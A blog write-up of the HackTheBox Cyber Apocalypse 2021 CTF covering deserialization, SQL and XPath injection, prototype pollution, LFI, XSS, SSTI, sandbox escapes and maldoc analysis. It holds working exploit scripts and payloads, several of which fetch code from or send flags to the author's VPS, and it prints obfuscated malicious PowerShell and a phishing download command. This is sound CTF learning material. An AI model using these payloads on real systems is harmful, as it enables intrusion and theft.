---
layout: post
title:  "HackTheBox CyberApocalypse CTF 21 write-up"
date:   2021-04-24
categories: CTF
thumbnail: /img/htb-cyberapocalypsectf2021.png#center
tags: HTB CA-CTF ctf web forensic misc deserialization ysoserial sqli scripting asti lfi xpath-injection blind-xss csp-bypass ssti maldoc olevba py-jail saleae hardware
---

We participated in the 5 days long Cyber Apocalypse CTF 21 hosted by HackTheBox and secured 94th place against 4740 teams comprised of 9900 players! I had final exams during this event but it's the first public CTF of HackTheBox! How could I resist?

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424083614.png#center)

Here is an index of all the challenges I solved, click on them to move to specific challenge write-up:

### Web

* [Millenium](#-millenium)
* [emoji voting](#-emoji-voting)
* [BiltzProp](#-biltzprop)
* [MiniSTRyplace](#-ministryplace)
* [Caas](#-caas)
* [E.Tree](#-etree)
* [The Galactic Times](#-the-galactic-times)
* [Starfleet](#-starfleet)

### Forensics

* [Key mission](#-key-mission)
* [Invitation](#-invitation)
* [AlienPhish](#-alienphish)

### Misc

* [Alien Camp](#-alien-camp)
* [Input as a Service](#-input-as-a-service)
* [Build yourself in](#-build-yourself-in)


### Hardware

* [Compromised](#-compromised)


&nbsp;

# # Web

## # Millenium

First we are given a login panel on the homepage. Submitting credential "admin:admin" works

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424032130.png#center)

Next, we are to type in a country name and a type of worm and launch to attack a country. If we intercept the payload, it looks like following:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210422203513.png#center)

Base64 encoded serialized Java objects starts with "rO0" that we can observe on the "worm" parameter.

I added this challenge first because it only had 54 solves and few months back I created a fuzzer script specifically for these scenarios which worked perfectly in this case! 

[https://github.com/rayhan0x01/GadgetSmith](https://github.com/rayhan0x01/GadgetSmith)

So, what it does? there's a Python3 script that you can modify to implement an HTTP Request for it to "Fuzz" an endpoint with serialized Java payloads to find which classpaths are available using a DNS ex-filtration technique that does not require BurpSuitePro collaborator and utilizes free DNSBins. 

Now why do we need to know classpaths or why even use it? First of all, if we get a callback, we confirm we have deserialization there. Secondly, if we know which classpath is available we can use matching gadget in &nbsp;`ysoserial`&nbsp; to generate right payload.

I modified the script available on the repo to send the same POST request we saw earlier:

```python
import subprocess, sys, requests

banner = """

Generate GadgetProbe payloads in base64 with free dnsbin (https://requestbin.net/dns)
Usage: python3 GadgetSmith.py wordlist.txt XXXXX.d.requestbin.net

"""

if len(sys.argv) < 2:
	print(banner)
	sys.exit()

wordlist = sys.argv[1]

dnsbin = sys.argv[2]

get_payloads = subprocess.getoutput("java -cp '.:GadgetProbe-1.0-SNAPSHOT-all.jar' gen_payloads.java %s %s" % (wordlist,dnsbin))

payloads = [ x for x in get_payloads.split('\n') if x.startswith('rO0') ]


if not payloads:
	print("[!] Something went wrong while generating payloads!")
	sys.exit()

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'} # burp

session = requests.session()
for payload in payloads:
	burp0_url = "http://138.68.168.137:31483/doLaunch"
	burp0_cookies = {"JSESSIONID": "39483D3A8EF4AA9707B6A875A0913590"}
	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://138.68.168.137:31483", "Connection": "close", "Referer": "http://138.68.168.137:31483/doLaunch", "Upgrade-Insecure-Requests": "1"}
	burp0_data = {"country": "[REDACTED]", "worm": "%s"% payload}
	session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,proxies=proxies).text
	print(".",end="")
```

I ran it with a classpaths wordlist, and a free dnsbin as argument to receive callbacks:

```python
python3 fuzz.py wordlists/FasterXML_blacklist.list [REDACTED].d.requestbin.net
```

Soon, checking results in requestbin, saw records showing up:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/2021-04-22_20-03.png#center)

Based on the received callback output, we know we can use "CommonsCollections4" gadget in &nbsp;`ysoserial`&nbsp; to generate our payload.

Saved a reverse shell payload on a file and hosted the file from VPS, used below command to generate a payload that will make our target server fetch the file and save it on the server:

```sh
ysoserial CommonsCollections4 'bash -c {curl,[REDACTED-MY-VPS-IP]:8888/x.sh,-o,/tmp/pb}' | base64 -w0
```

Sent the generated base64 payload on the "worm" parameter and got the file downloaded in target server. Next, again used another payload to run the saved script to get a reverse shell:

```sh
ysoserial CommonsCollections4 'bash -c {bash,/tmp/pb}' | base64 -w0
```

Got reverse shell as root:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210422202221.png#center)

The flag was located in "/root/flag.txt"

```
CHTB{sw33t_l33t_s3r14lzz_@$#?}
```

&nbsp;

## # emoji voting

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210425030019.png#center)

We are given source code of the application, The application is based on NodeJS and uses SQLite database. We can see on the "challenge/views/database.js" file the "getEmojis" function does not use parametrization before adding user input to SQL query:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424053017.png#center)

This introduces a blind SQL injection vulnerability. We can see from "challenge/routes/index.js", this function is invoked when a request is made to "/api/list" endpoint:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424053344.png#center)

Here is the full script I wrote in a hurry during the event, so it may look bad but it gets the job done!

```python
import requests, time

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'} # burp

def send_payload(url,sqli):
	_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Cache-Control": "max-age=0", "Content-Type": "application/x-www-form-urlencoded"}
	_data = {"order": sqli}
	resp = requests.post(url, headers=_headers, data=_data).text
	if 'alien' in resp:
		return True
	else:
		return False


def sqli():
	url = "http://138.68.168.137:31279/api/list"

	sqli_temp = '1 limit _LEFT_ = _RIGHT_'
	
	# get length of flag table name
	left = '(select length(name) from sqlite_master where name like \'flag%\')'

	for i in range(1,21): # guessing flag table name would be max 20 chars

		sqli = sqli_temp.replace('_LEFT_',left)
		sqli = sqli.replace('_RIGHT_',str(i))

		#print(sqli)
		print(i,end='\r')

		res = send_payload(url,sqli)

		if res:
			dataLength = i
			break 

	print("\n\n[+] Found tablename length: %s\n" % dataLength)

	flag_table = 'flag_'

	# extract flag table name
	
	for charPos in range(6,dataLength+1): # dataLength is either known or we extracted it beforehand

		left = '(select unicode(substr(name,_POS_,1)) from sqlite_master where name like \'flag%\')'.replace('_POS_',str(charPos))

		for char in range(32,127): # printable ascii range 32 to 126
			sqli = sqli_temp.replace('_LEFT_',left)
			sqli = sqli.replace('_RIGHT_',str(char))
			#print(sqli)
			res = send_payload(url,sqli)

			if res:
				flag_table = flag_table + chr(char) # append to extracted data from ascii to char
				print(flag_table,end='\r')
				break

	print("\n\n[+] Extracted flag tablename: %s\n" % flag_table)

	
	# get length of flag content
	left = '(select length(flag) from %s)' % flag_table

	for i in range(1,70): # guessing flag would be max 70 chars

		sqli = sqli_temp.replace('_LEFT_',left)
		sqli = sqli.replace('_RIGHT_',str(i))

		#print(sqli)
		print(i,end='\r')

		res = send_payload(url,sqli)

		if res:
			flagDataLength = i
			break 

	print("\n\n[+] Found flag data length: %s\n" % flagDataLength)


	flag_data = ''

	# extract flag data
	
	for charPos in range(1,flagDataLength+1): # dataLength is either known or we extracted it beforehand

		left = '(select unicode(substr(flag,%d,1)) from %s)' % (charPos,flag_table)

		for char in range(32,127): # printable ascii range 32 to 126
			sqli = sqli_temp.replace('_LEFT_',left)
			sqli = sqli.replace('_RIGHT_',str(char))
			#print(sqli)
			res = send_payload(url,sqli)

			if res:
				flag_data = flag_data + chr(char) # append to extracted data from ascii to char
				print(flag_data,end='\r')
				break

	print("\n\n[+] Extracted flag data: %s\n" % flag_data)


def main():
	sqli()

if __name__ == '__main__':
	main()
```

Flag contents:

```
CHTB{order_me_this_juicy_info}
```


&nbsp;


## # BiltzProp

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210425030231.png#center)

This challenge contained a Prototype Pollution to RCE via AST Injection.

We can see on the "challenge/routes/index.js" file, "unflatten" function from "flat" module was called on request-body/post data:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424054510.png#center)

From "package.json" file we can see the "flat" module package installed is "5.0.0" which suffers from a Prototype Pollution vulnerability via Abstract Syntax Tree. You can read detailed explanation of this vulnerability from below blog post:

[https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

To exploit this vulnerability and read the flag, sent below payload on the "/api/submit" endpoint:

```
POST /api/submit HTTP/1.1
Host: 46.101.54.143:31722
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 203
Content-Type: application/json

{"song.name": "ASTa la vista baby", "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`cp /app/flag* /app/static/js/flag.txt`)"
}}
```

The flag file was copied in webserver's static directory for us to read.

```
CHTB{p0llute_with_styl3}
```

&nbsp;

## # MiniSTRyplace

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210425030433.png#center)

This was one of the easiest web challenges. We were given application source code. There was a local file inclusion vulnerability located in "challenge/index.php" file:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424055413.png#center)

We can see it replaces "../" with blank so if we submit "..././", it becomes "../" allowing path traversal and access to the flag. The flag was retrieved with single GET request:

```
GET /?lang=..././..././..././flag HTTP/1.1
Host: 139.59.185.150:30822
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _ga=GA1.1.715129269.1596907848
Upgrade-Insecure-Requests: 1


```

```
CHTB{b4d_4li3n_pr0gr4m1ng}
```

&nbsp;
## # Caas

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210425030651.png#center)

This was also one of the easiest web challenges. We were given application source code. There was an argument injection vulnerability on "curl" command which can be seen on "challenge/models/CommandModel.php":

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424055939.png#center)

We can't inject arbitrary commands to this because of the "escapeshellcmd()" function but we can add arbitrary parameters. Added parameter to post the flag file on a remote IP where I hosted a netcat listener to view POST data:

```
POST /api/curl HTTP/1.1
Host: 138.68.185.219:30826
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:1337/
Content-Type: application/x-www-form-urlencoded
Origin: http://127.0.0.1:1337
Content-Length: 48
Connection: close

ip=-F password=@/flag http://[REDACTED-MY-VPS-IP]:8000/
```

```
CHTB{f1le_r3trieval_4s_a_s3rv1ce}
```

&nbsp;
## # E.Tree

This challenge contained an XPATH injection vulnerability. We were given an XML file that contained hint to where the flag is:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424061003.png#center)

Unfortunately I don't have a screenshot of the web-ui but there was an input field that when submitted searches the string against that XML file using XPATH query.

I have never exploited this bug before so with trial and error I managed to create payloads that gave results like boolean-based blind SQLi where I get positive response content if my XPATH payload results in True and empty/negative response content if the payload results in False.

My aproach was to submit a non-existent username to search along with "or" and "and" operators to slip in my conditional payloads:

```sql
rh0x01' or _LEFT_ = _RIGHT_ and '3'='3
```

For example, in the "\_LEFT_" section I can specify to get first character of the flag using:

```sql
substring(/military/district/staff/selfDestructCode,1,1)
```

In the "\_RIGHT_" section I can put all alphabets one by one and if they match we get a positive response content.

Here's the script I wrote to automate this:

```python
import requests, time

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'} # burp


def send_payload(url,payld):

	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://138.68.148.24:30825/", "Content-Type": "application/json", "Origin": "http://138.68.148.24:30825", "Connection": "close"}
	burp0_json={"search": payld}
	resp = requests.post(url, headers=burp0_headers, json=burp0_json).text
	
	if 'XPathEvalError' in resp:
		return False
	elif 'staff member exists.' in resp:
		return True
	else:
		return False


def xpath_inject():
	url = "http://139.59.190.72:30526/api/search"

	payld_temp = "rh0x01' or _LEFT_ = _RIGHT_ and '3'='3"
	
	
	flag_data = ''
	
	# extract first half of the flag

	for charPos in range(1,22): # first half of the flag in one element

		left = 'substring(/military/district/staff/selfDestructCode,%d,1)' % charPos

		for char in range(1,160): # printable ascii range 32 to 126
			payld = payld_temp.replace('_LEFT_',left)
			payld = payld.replace('_RIGHT_',"'%s'" % str(chr(char)))
			print(payld)
			res = send_payload(url,payld)

			if res:
				flag_data = flag_data + chr(char) # append to extracted data from ascii to char
				print('Flag Data : %s' % flag_data)
				break

	print("\n\n[+] Extracted first half of flag data: %s\n" % flag_data)


	# extract other half of the flag
	
	for charPos in range(1,15): # second half of the flag in one element

		left = 'substring((/military/district/staff/selfDestructCode)[last()],%d,1)' % charPos

		for char in range(32,127): # printable ascii range 32 to 126
			payld = payld_temp.replace('_LEFT_',left)
			payld = payld.replace('_RIGHT_',"'%s'" % str(chr(char)))
			print(payld)
			res = send_payload(url,payld)

			if res:
				flag_data = flag_data + chr(char) # append to extracted data from ascii to char
				print('Flag Data : %s' % flag_data)
				break

	print("\n\n[+] Extracted flag: %s\n" % flag_data)

xpath_inject()

# Flag received: CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0Tr0l}
# There's "n" missing on the last part that was needed to be manually added to submit correct flag
# Correct Flag : CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}
```

As we've seen from the XML file, the flag was split into two record sections thus I had to use "[last()]" to get the last "selfDestructCode" entry.

```
CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}
```

&nbsp;
## # The Galactic Times

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210425033314.png#center)

This was a great challenge with hilarious homepage content. We were given source code of the application. We get a feedback form on the "/feedback" endpoint:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424062932.png#center)

When we submit a feedback it calls the "db.addFeedBack" function and after insertion, it calls the "bot.purgeData" function which can be seen on "challenge/routes/index.js" file:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424063305.png#center)

The "db.addFeedBack" function simply adds our feedback in database, and the "bot.purgeData" function then uses "puppeteer" module to launch a headless Google Chrome instance and visits the "/list" endpoint to view our feedback. Once visited, it deletes the feedback by calling the "db.migrate" function which can be seen on the "challenge/bot.js" file:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424063507.png#center)

Also by observing the source, we know the flag can be viewed on "/alien" endpoint which can only be accessed by localhost hinting somehow we force the bot to visit that page and transfer the flag to us. This localhost check can be seen on "challenge/routes/index.js" file:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424063653.png#center)

The feedback value is not sanitized and directly inserted into DOM element so we can have XSS but there is a content-security-policy enforced throughout the application which can be seen on "challenge/index.js":

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424064539.png#center)

However the Cloudflare CDN is referenced as an accepted source which allows us to inject script tag with older libraries such as "angular.js" from this CDN and use it's specific tag to get XSS:

{% raw %}
```
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };var z=new XMLHttpRequest();z.onreadystatechange=function(){if (z.responseText) location="http://[REDACTED-MY-VPS-IP]:4442/?a="+btoa(unescape(encodeURIComponent(z.responseText)))};z.open("GET","http://184.164.70.30:4442/alien",false);z.send();//');}} </div>
```
{% endraw %}


The payload first visits the "/alien" endpoint then encodes the page source, and finally sends the browser to my VPS location along with the encoded source as a GET parameter.


&nbsp;

## # Starfleet

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210425033209.png#center)

This challenge contained an SSTI vulnerability. We were given application source code. We get to submit an email address on the homepage that gets rendered via "nunjucks" templating engine which can be seen on "challenge/helpers/EmailHelper.js":

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424065848.png#center)

We also see there is a "readflag" binary that we must run in order to read the flag from /root/flag.txt.

Simply submitted below payload to read the flag and send the content via POST request to my VPS IP:

{% raw %}
```
rh0x01{{range.constructor("return global.process.mainModule.require('child_process').execSync('curl -X POST --data $(/readflag) [REDACTED-MY-VPS-IP]:8888')")()}}sir@flag.pls
```
{% endraw %}

Caught the flag content using netcat listener:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424070257.png#center)

```
CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}
```

&nbsp;

# # Forensics

## # Key mission

We were given a pcap file that contained USB capture, there were similar challenges in other CTFs so people even made scripts to solve it.

[https://github.com/TeamRocketIst/ctf-usb-keyboard-parser](https://github.com/TeamRocketIst/ctf-usb-keyboard-parser)

Extracted all the keyboard input data using below command:

```
tshark -r ./key_mission.pcap -Y 'usb.capdata && usb.data_len == 8' -T fields -e usb.capdata | sed 's/../:&/g2' > usbPcapDat
```

Used the script from above repo to purse the keys:

```sh
$ python usbkeyboard.py usbPcapDat
I am sending secretary's location over this totally encrypted channel to make sure no one else will be able to read it except of us. This information is confidential and must not be shared with anyone else. The secretary's hidden location is CHTB{a_plac3_fAr_fAr_away_fr0m_earth}
```

&nbsp;

## # Invitation

We were given a file named "invite.docm". I first unzipped the doc file and used "olevba" tool on the "vbaProject.bin" file:

```sh
olevba -c vbaProject.bin
```

Clearly it contains malicious macro for code execution:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424071131.png#center)

There is a VBA Emulation engine written in python called "ViperMonkey" which can be used to analyze and deobfuscate malicious VBA Macros contained in Microsoft Office files.

[https://github.com/decalage2/ViperMonkey](https://github.com/decalage2/ViperMonkeys)

Used the docker script provided in the repo to run the tool against our doc file:

```
docker/dockermonkey.sh invite.docm
```

The payload was deobfuscated and it displayed the shell command that was being executed:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424072833.png#center)

Base64 decoded the encoded payload in UTF-8LE format and got following code:

```
. ( $PshomE[4]+$pshoMe[30]+'x') ( [strinG]::join('' , ([REGeX]::MaTCHES( ")'x'+]31[DIlLeHs$+]1[DiLLehs$ (&| )43]RAhc[]GnIRTs[,'tXj'(eCALPER.)'$','wqi'(eCALPER.)';tX'+'jera_scodlam'+'{B'+'T'+'HCtXj '+'= p'+'gerwqi'(" ,'.' ,'R'+'iGHTtOl'+'eft' ) | FoREaCH-OBJecT {$_.VALUE} ))  )

...snip...

SEt ("G8"+"h")  (  " ) )63]Rahc[,'raZ'EcalPeR-  43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )';2'+'N'+'1'+'}atem_we'+'n_eht'+'_2N1 = n'+'gerr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . "  ) ;-jOIn ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue[ - 1.. - ( ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue.LengtH)] | IeX 

...snip...
```

I removed the irrelevant parts, the above two portions contains the flag. By running the command portions manually in PowerShell, retrieved the flag.

```
CHTB{maldocs_are_the_new_meta}
```

&nbsp;

## # AlienPhish

Extracted the pptx file, observed a cmd command on "slides/_rels/slide1.xml.rels" file:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424073815.png#center)

The command when url-decoded:

```
cmd.exe /V:ON/C"set yM="o$ eliftuo- exe.x/neila.htraeyortsed/:ptth rwi ;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'   pmet:vne$ = o$" c- llehsrewop&amp;&amp;for /L %X in (122;-1;0)do set kCX=!kCX!!yM:~%X,1!&amp;&amp;if %X leq 0 call %kCX:*kCX!=%"
```

It is written in reverse but we can see the binary name "Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99" is a url-safe base64 encoded payload:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424074033.png#center)

```
CHTB{pH1sHiNg_w0_m4cr0s???}
```


&nbsp;

# # Misc


## # Alien Camp

This was a classic get question and reply answer back on a socket connection type challenge. When you connect and input "2" you get a list of emojis and their associated values. You then have to answer 500 mathematic equations represented by those emojis. 

Here is the script I wrote for this:

```python
#!/usr/bin/env python3


from pwn import *
import re

r = remote("46.101.22.121",30437)
r.recv()
r.sendline("1")
d = r.recv().decode()
e = r.recv().decode()
print(d)
print(e)

emojis = {
"🌞" : re.findall("🌞 -> (\d+)",d)[0],
"🍨" : re.findall("🍨 -> (\d+)",e)[0],
"❌" : re.findall("❌ -> (\d+)",e)[0],
"🍪" : re.findall("🍪 -> (\d+)",e)[0],
"🔥" : re.findall("🔥 -> (\d+)",e)[0],
"⛔" : re.findall("⛔ -> (\d+)",e)[0],
"🍧" : re.findall("🍧 -> (\d+)",e)[0],
"👺" : re.findall("👺 -> (\d+)",e)[0],
"👾" : re.findall("👾 -> (\d+)",e)[0],
"🦄" : re.findall("🦄 -> (\d+)",e)[0]
}

print(str(emojis))

r.sendline("2")

for i in range(1,501):
	ques = r.recv().decode()

	print(ques)

	equation = ''
	for c in ques:
		if c in emojis:
			equation = equation + ' ' + emojis[c]
		elif c in ['*','-','+','-']:
			equation = equation + ' ' + c

	res = eval(equation)
	print(res)
	r.sendline(str(res))

flag = r.recv().decode()

print(flag)
```

```
CHTB{3v3n_4l13n5_u53_3m0j15_t0_c0mmun1c4t3}
```

&nbsp;
## # Input as a Service

On this challenge, when we give input it gets evaluated by "exec" in Python2, we can confirm this by supplying "\__builtins__":

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424074736.png#center)

Since we have builtin functions access, we can easily get code execution:

```python
().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('id')
```

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424074846.png#center)

the flag.txt was present in current directory:

```python
().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('cat flag.txt')
```

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424075039.png#center)

```
CHTB{4li3n5_us3_pyth0n2.X?!}
```


&nbsp;
## # Build yourself in

This challenge is also similar to previous challenge where when we give input it gets evaluated by "exec", but this time the interpreter is Python3 and there is no "\__builtins__". The code gets executed with below command:

```python
exec(text, {'__builtins__': None, 'print':print})
```

We can still print stuffs out because print function is supplied to exec.

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424075238.png#center)

When I try a classic Python3 payload to get to "system" function from "os" module, we get "No Quotes Allowed!" error so we can't use quotes in our payload.

We can reach the subclasses:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424075420.png#center)

The "os.popen" method or "catch\_warnings" class is not available in this list, there's "os.\_wrap_close" present on "132" index.

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424075604.png#center)

I can reach globals dictionary from this class:

```python
print(().__class__.__base__.__subclasses__()[132].__init__.__globals__)
```

The globals dictionary contained "os.popen" function but remember we cannot use quotes so we cannot specify like "dict.get('popen')" to access the dictionary Item to reach the function. Since builtins is unavailable we cannot use chr() either to get chars from ordinal values.

The bypass lies in the help string present within many of those classes accessible via ".\__doc__". We can save the help string in a variable and then use list index to reach each character to build out a string. For example, to build the string "popen":

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424080200.png#center)

We can now reach the popen function and execute commands the same way by building string from characters.

```
# id
x=().__doc__;print(().__class__.__base__.__subclasses__()[132].__init__.__globals__.get(x[84]+x[34]+x[84]+x[26]+x[24])(x[9]+x[118]).read())

# ls
x=().__doc__;print(().__class__.__base__.__subclasses__()[132].__init__.__globals__.get(x[84]+x[34]+x[84]+x[26]+x[24])(x[3]+x[19]).read())

```

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424080519.png#center)

We can see the flag there, we can convert the command "cat flag.txt" like we did for previous commands to read the flag. But the help string we got from first class did not contain the letter "x", so I had to check other classes that were available and their help string if they contained the letter "x". Got it from a class that was present on 10th index. 

```
().__class__.__base__.__subclasses__()[10].__doc__[19]
```

Note, this may not work on your local python3 because of the index mismatch.

Now the final payload:

```
x=().__doc__;print(().__class__.__base__.__subclasses__()[132].__init__.__globals__.get(x[84]+x[34]+x[84]+x[26]+x[24])(x[25]+x[14]+x[13]+x[18]+x[31]+x[3]+x[14]+x[38]+x[27]+x[13]+().__class__.__base__.__subclasses__()[10].__doc__[19]+x[13]).read())
```

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424080813.png#center)

```
CHTB{n0_j4il_c4n_h4ndl3_m3!}
```

&nbsp;
# # Hardware


## # Compromised

We were given a file named "compromised.sal". The file can be opened with a tool called "Logic2" from Saleae:

[https://www.saleae.com/downloads/](https://www.saleae.com/downloads/)

After opening the program, loaded the capture data file that was given and switched to "Analyzers" tab. From there, clicked on "+" icon at top right and selected "I2C". Added The channels like below:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424081423.png#center)

After the analyzer is loaded, selected terminal view and saw following hex data:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424081545.png#center)

I first extracted all the hex values and tried decoding it via CyberChef:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424081624.png#center)

We can see portions that looks like flag. I then cross matched the chars "C","H","T","B" with terminal output and saw those characters were printed in hex when the write was done to "0x2C". So I removed all other hex values that were not written to "0x2C" and decoded via CyberChef:

![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424081840.png#center)

```
CHTB{nu11_732m1n47025_c4n_8234k_4_532141_5y573m!@52)#@%}
```


That was it for this one! We did not plan to play this CTF beforehand as I had final exams, some of my teammates were sick but we pulled off an excellent position competing against more than 4 thousand teams! Thanks to all my teammates and specially [@waldoirc](https://twitter.com/waldoirc) and [@landhb](https://twitter.com/landhb_) for all the pwn solves!
